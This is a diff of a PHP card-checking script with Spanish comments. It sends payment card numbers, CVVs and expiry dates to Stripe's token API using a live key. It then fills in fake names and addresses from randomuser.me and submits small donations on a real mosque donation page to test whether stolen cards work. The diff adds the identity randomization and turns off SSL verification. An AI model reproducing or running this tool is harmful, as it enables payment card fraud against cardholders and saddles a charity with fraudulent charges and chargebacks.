@@ -2130,58 +2130,74 @@ $BinData = BinData($bin); //Extrae los datos del bin
 
 
 
-$curl = curl_init();
-curl_setopt_array($curl, [
-  CURLOPT_URL => 'https://api.stripe.com/v1/tokens',
-  CURLOPT_RETURNTRANSFER => true,
-  CURLOPT_ENCODING => '',
-  CURLOPT_MAXREDIRS => 10,
-  CURLOPT_TIMEOUT => 30,
-  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
-  CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => 'muid=fa03bb20-72b0-48ae-960a-ac9851722b7fc75a6e&sid=f6f3d11e-71ac-400f-b733-e9ca922c970a551874&guid=NA&referrer=https%3A%2F%2Fgoodbricksapp.com&time_on_page=118904&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_month%5D='.$mes.'&card%5Bexp_year%5D='.$ano.'&card%5Baddress_zip%5D=10010&radar_options%5Bhcaptcha_token%5D=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5Ijoiak1EaU1hZXArazAvc2F6MUFuazIreW9Ka29LVzFlSVhucjZrdDViQWRvL0pTRXhuWVg3ekk2ZjB6YUdZUWNaOGVrMGtrcy9HNklOSWc1VDdGWGtEanVITEIvbW9kMGsrZ3hlUkpMUng4Y0Q4MWkxREtKdzd4SVVtbXM1dzZVYm0xMndjNm1yQmtpMEVGRGFLbWRsM1BrZ3pFM0xCNmJKQWxUbkZadUxJd0xYcWN2cXcvY3hzaVRCNEl4K3g2YXpRMjFsczZVbXE0cktRK0lHNnBmTEtUVE82aDRXWVJXcXB1amE2NW1WNVBCMlYzTlNTUCtSWW9qTXNJNDNRU0d2Y1I2UUdaUUpQcWdTWDR4Nks3NUFoY2h1RXl2ZkIySi9zZGRjUDlOM2xtbnluQ0c0TDlMVlZDS1g3RlMxdGtBZlFQNTk4d2s5cmZaSXZidnZZQWVnRkFXM3dlVnREYWx5WVNUTlBMVTlIcnc1WTlpZENEeEh2UEVrYTA2REVOMkdrVTV3SFBRV0dRK3hxVFB3TVZpZFp1YWRXUW5mUll0RVhab3lxNXlzcm55NUlsZytWbmVUcWNsMGU4VU5SK245aUd3VHpLUzREM0FZUkZ5ZnBSTEQ3WFNUbjFSYlhCV0EvcjBWMXZROFFNK2FQbHNEY281OVV3dTRTQ0YvVXR3S01sL2RwZWs3VjRWd0tQZ2NTREo1RVFGdDNtS21IVjk1OWZ1bUdjSDJiSmpROEV6RkxUK25TSTVzNEpoc0E0MjB1WGt4WmFzZXI0eXNsMnBiYUovVUdnNjlaN1hWZGtBL05MTU1XcUlTc080alBMVzE2OC81TXBwNnRrY1pYSm1FWTJRcnMzcnVrV3BaUWFUR0JFdGt6cUxkTmxLaWxFQlFzZUQ3eG5nSHkvVlZQY0pnV0dCMXd3T3VXL0Uza3Q2L1lsdGEyQUxPTHlwUjF1eHB0TVhGSjhpMjV1Zi9KaEUxTnp6VFRmVFNEUkhFQThyazFCbG1SUDJOdFNULzlTczUzb1puZnpNeFVTeWl6WTc0bTVmUUR2ZWs4UmsvbW1jcVdQMUxoZHR0V0loSTNEQWt2bDRUd3dmeUhYU3ROL2RaNzhaUUlIMjVoUUQ3eEZDNGhCaTUwNGE0anFSVVZQWVZrRXF1VGlOWVhrTk5xZ3UrVkZYNlVBWnAzY2dUdHNCUUlvWk9PaWNoL0xPN0FjTkFWNVFhaURMMWpiTDk3Q2hTSnBhMGlxVTMwYytYWWdqR244VVF4S3h3ZWE2OFBPK0h5M1IrUExXVk84VzZ5aU50amMvK1lsUlJJdnNCY1MrYzdNc01MNUtSYW9rekVNVzRPSEIzV0ViRzIzUkNrcWNzbktyR3ZFZnFaNWtKandTZXJPOHNzL1R4cmh2RDRLUGFzUlN4bEZ4T1FNaUN2YWFyMjVpZndrR2FvUTk3RUxSNGlJcno5Wno0bmpoS2FoL2lDYmNGTUhZSzFFOTlRNUhzRkxQdTdsSlU5d0FCTXFGbHY3eEdEOFBHMlhlR05pYWt1dE5sR1Q2ckMrSDk2elVHR0RndEFGQjBmVDVGdFhlVUJqNnJyK09vcUxXdXM5UFdDQmg3QjloK3piNEs4cUJkbU15MTlBN2hyQ0pCWUFIQ1RIUUdoUzkxYTlYeUtpYmNXRzQxZXUvZkk0UXoxbmVWSGZyMjVKRERPeE1mN3BjaFp5UjFMTkZKVHMwUGYxTDJNbDBJRWk2K2ZqN3RmS1dsUTB4ZjBqaEpPTjV3REdVaWpWVHJPUkFVY1c2a0RnWGhSd2tXMFgreGlFeDRNS09ZeitUNXVZbDVSMkpNZ1phcUtyQmE2SFB2eHBFOEpHcFNCVGpmcjAyTGRibFdpdzBsOEg0eVNvSUVzQURvTHBEeThRKzluVTNNTnZza1BnQnVjZitzWTMweFk0QlZ6RnVhdEZNNS9XYkpYbGJUaTMzRUpuZjdPMjVOSVVkZVV6eVpGaXhweUNJbWlPWjk3VkhUeVYxNlVhK1p5US9aekU4a3k5UGFuamw4K2ZFWUp4Y2V6YjN5VmJ5bE1WeUdHQWR6UzU0SW9UQm9KbXI4UFBtaHZVa0VFVmFybXRidlFMMVpLK1hpMGxjSUpiOENicWZTVHhBdmVXbmxrNUExRW9GRWlmbEZ2clc0NW1TcmdjVGpGbjVDRHNDTmxBK3UxVU45SmVrYXRLSlNWdUhnK01PRjVzaXVUYkdlN0ZxQ3d1NUNwb0x4aU9sMUQzbW9VVVNtR0ZoL3JRdXM4Umd4QWJZZDZqVXBDQjJHRG00bzZsclBOVXdjQ1JMWk1ncUpKY0k0MTcyOVNMQ2V3ek12QUtReVdtYVFxbkQ5Yk0xR3NoaHNtTEZlNUNqcDhhV1oxUWJDOWovVEM4S3dpZXlFWmZKa0Q0bmJ4bG9kakd4VkpLVWRhV1Q5RzVGajBRci9VQ3hiTUdQUGl4SWJIZTc4L1NGK1dyaGRiQ1N1TVM0OEt5cGNoSnRzOEVQODc5U0trY3FjS1VKbkRWcnh3OVRxSE41eGxxbEV1Wnd5YnFobldDOENHZC9iNGUzQVFNNFBOWENqRXZqV3B4OWs4QSsxUlF1aFBtQitiYTlGZzA1QlhmUEFyQ3NBYjZVQmx5U2wzWkFRTzUxcU1IaUVpQUs0eTVxeUFvZlZRcytMUXJWMVAxa0p2d1R2RnZScHpsNVMrSHI2aFIxV3FjY1ErbmY1eUEzVENHTkJPZXlpSCtsbVJKOURGeGRCbVZBUTgxQlpDMFdCbmpUb3h5Rm01V2hUT2xBRT0iLCJleHAiOjE3MzEzNDYzNDAsInNoYXJkX2lkIjoyMjE5OTYwNzMsImtyIjoiM2M0MzkzMSIsInBkIjowLCJjZGF0YSI6IkN1ZjhuV2c3VkN5RTZ1WUtjV3NkRGNQSEZteDlnWlA0WDNZRGRSdmc3TXd4SzhiZ3JKYnRtNWs1QjlranJkc2QxNzF2UVFsNU13RHBOQU9weVBsZTVBTzkyUU9ZT3J6RUZvYlpyV0FEWnlIa3pPc0NtU2hIbThyQm5IWE9hbFBBL1hkTHFreVpBNWVhaVhOSk84MWNibVV4ZE5GcUpmRDBWWk5UQ0pHYmdXMmc5TzZSRnlIUjArYTVvMnlFZXhLZ0JmWGM4U2tpNm84cUNjZ2YifQ.e01XX6dExiWPNYOjwqfINjPXgxysFkU6D2tlVLOLz2s&payment_user_agent=stripe.js%2F957f55b385%3B+stripe-js-v3%2F957f55b385%3B+card-element&pasted_fields=number&key=pk_live_41FIHoENH2ilJLW1pkGdu3wb',
-  CURLOPT_HTTPHEADER => [
-    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
-    'Accept: application/json',
-    'Content-Type: application/x-www-form-urlencoded',
-    'accept-language: es-US,es;q=0.8',
-    'origin: https://js.stripe.com',
-    'referer: https://js.stripe.com/',
-  ],
-]);
-$response = curl_exec($curl);
-$err = curl_error($curl);
+//RANDOM USER//
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/1.2/?nat=us');
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$get = curl_exec($ch);
+curl_close($ch);
+        preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
+        $name = $matches1[1][0];
+        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
+        $last = $matches1[1][0];
+        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
+        $email = $matches1[1][0];
+        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
+        $street = $matches1[1][0];
+        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
+        $city = $matches1[1][0];
+        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
+        $state = $matches1[1][0];
+        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
+        $phone = $matches1[1][0];
+        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
+        $postcode = $matches1[1][0];
+
+////SACA EL TOKEN//
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0');
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F3d0d0fc67%3B+stripe-js-v3%2F3d0d0fc67&time_on_page=63244&key=pk_live_41FIHoENH2ilJLW1pkGdu3wb&pasted_fields=number');
+$response = curl_exec($ch);
+$err = curl_error($ch);
 $json = json_decode($response, true);
-curl_close($curl);
+curl_close($ch);
+/*
+$token = trim(strip_tags(getstr($result,'id": "','"')));
+$ip = trim(strip_tags(getstr($result,'client_ip": "','"')));
+*/
 $token = $json["id"];
 $ip = $json["client_ip"];
 
+//---------------PRUEBA LAS CCS EN PAGINA DE DONACION---------------//
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://goodbricksapp.com/icsd.org/donate');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0');
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'g-recaptcha-response=03ANYolqtrAXy5zIt2AjPl_v86EhHB_0O8YEgRQ73dmNp0E6rS3OaDFJqwYHwDoSLyD6Z9plsGVb3XvVAqEvqVWJTNX-YDYXAx2ynIggYNEIE5ns3byzDEIOJMghcj6qkmnzTyM4nzk3XRnSeqndz8VbvON0ctHxIbblzlqdtAwfNLKyYN3Z4QvcOqK8RmrhIJNInTgDRBAXqo8cCS3hg2xlDTbuzXSS1EV4WAlTE0yIyUVAs27f63DSS4MRZL-jX8ifTCcHmDgX3sKX92atN3k3vI91QTJ8TGmPkcuWTj4xgBnktDyFxQSIPMY2yORw5d90yIDfUHQV62ZAn3TQvZ0l_psLuVhs15xrah2ZGuA-qTBuAhAM64qn8WXaw2YCXQMG1rU4RkUeYm3PvsV0_Yxq9aBzDMC7g6aySQP-1RUw2AA6Ma7yTWvhdwL7tWcs7iy6-5fWF86dIb2tBujmSMzwfr4EdOZ1PD4Q&token='.$token.'&clientIp='.$ip.'&categoryAmount=5&paymentIterations=0&categoryName=funeral+expenses&firstName='.$name.'&lastName='.$last.'&email='.$email.'&customerEmailValidation=&phone='.$phone.'&address=true&addressStreet='.$street.'&addressApt=&addressCity='.$city.'&addressState='.$state.'&addressZipCode='.$postcode.'');
 
-$curl = curl_init();
-curl_setopt_array($curl, [
-  CURLOPT_URL => 'https://goodbricksapp.com/icsd.org/donate',
-  CURLOPT_RETURNTRANSFER => true,
-  CURLOPT_ENCODING => '',
-  CURLOPT_MAXREDIRS => 10,
-  CURLOPT_TIMEOUT => 30,
-  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
-  CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => 'g-recaptcha-response=03AFcWeA60zBKn9m0pp0JvZ4xtNPcPyZ_RdxOzafIkj62QXQfE3-qc5jEphvTfhBTPaiOb8K01f5Bo5XkxDo_LnziWW30nlFjIgoAW3JuuF94utCt7KmKOQoD-_wu94K4qS_EeLm3qEs_xqo7vSOWBH6kTzqp2Sm9WFrJfFz8T1Os-gkB9gK9EFifeQ572UPIdPWjfOFYHFnfGA8yKbweZ0irKXja96LsXmlfaOttCWZii7qU4bya1DZ1kZnTH9DznbDWNibVr0ATaBlgw4Qj-_6Y0so7PFl309PDQCTAfUZ2a_sdHV_JF_R3qhpBWbcUihncgULyYjrmq5IXSe5aVHKC2_AHjJAkc_s-8mhTV0B0dHEkkUprBWtb6fI_6A_wi9y35Ap6Fe42L9wYnqpiePY4JnYq-S49RfoPjnH5jaee67ig6k4TmS0oArDeZ3J-Ig7GpTjysYRhxo07TFdXN1vvNHh9MEWjxOeDMhjR4WbOgaKKLjT0MdijWQP9R_5iYhskMPWw0WzbchvM5BSJLjmLqeMZy_THd5m4ogT0GR8e2BXKscqimPL0iHQ9NRkPQAoe9Ync_SMZdlN8NrZ84_F3gF3-sqWjhjgh4AI7Y8CHNZk-ICGxYuS-JatFjA3EUH7aAhsX0kBBhS5jc3l9SitdQEPgKEqUjFupfGQ5_9U5GLdmxSEidT9wIsotFOdhkoQeZRwhbzwZ_RpW0qrZee2iwzYoiZvokp9zGRHCaS9MPXh16Yg8NbMtmeBuQKQy4iZuulJtrtW_M0a8_DfNtJx2wf6HdGFflBPu11b8T7ffhhLZxhM6vBiqtKRxTkR_oziILgbxtcc5WCqLBXMm0Rcq9DIgwi4-iaKWcgJ1pQfSXECXqKpyYPBm2KFEVS-yf63DzUjix_Hoh&token='.$token.'&clientIp='.$ip.'&categoryAmount=5&paymentIterations=0&categoryName=masjid-operations-2024&firstName=Carlos&lastName=Perez&email=Dausitherer%40cuvox.de&customerEmailValidation=&phone=%28417%29+920-4022&addressStreet=&addressApt=&addressCity=&addressState=&addressZipCode=',
-  CURLOPT_HTTPHEADER => [
-    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
-//    'X-Requested-With: XMLHttpRequest',
-//    'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
-    'Origin: https://goodbricksapp.com',
-    'Referer: https://goodbricksapp.com/icsd.org/donate',
-  ],
-]);
-
-$response = curl_exec($curl);
-$err = curl_error($curl);
+$response = curl_exec($ch);
+$err = curl_error($ch);
 $json = json_decode($response, true);
 $respo = explode(';', $json['message'])[0];
-curl_close($curl);
-
+curl_close($ch);
+	
 
 $timetakeen = (microtime(true) - $startTime);
 $time = substr_replace($timetakeen, '', 4);
